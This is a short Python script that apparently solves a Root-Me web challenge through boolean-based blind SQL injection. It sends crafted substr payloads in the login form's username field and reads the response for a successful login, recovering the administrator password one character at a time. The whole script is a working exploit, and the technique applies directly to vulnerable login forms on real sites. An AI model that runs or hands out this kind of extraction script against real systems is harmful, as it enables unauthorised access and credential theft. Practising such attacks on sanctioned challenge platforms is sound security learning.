import requests

target = "http://challenge01.root-me.org/web-serveur/ch10/"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$_-"
username = "administrator"
password_extracted = ""

for i in range(1, 100):  
    found = False
    for char in chars:
        payload = f"' AND substr((SELECT password FROM users WHERE username='{username}'), {i}, 1) = '{char}'--"
        data = {
            'username': payload,
            'password': 'test'
        }

        r = requests.post(target, data=data)

        if "Welcome" in r.text or "You are connected" in r.text:  
            password_extracted += char
            print(f"[+] Found character {i}: {char}")
            found = True
            break
    if not found:
        print("[!] Finished extraction.")
        break

print(f"\n[✔] Extracted Password: {password_extracted}")
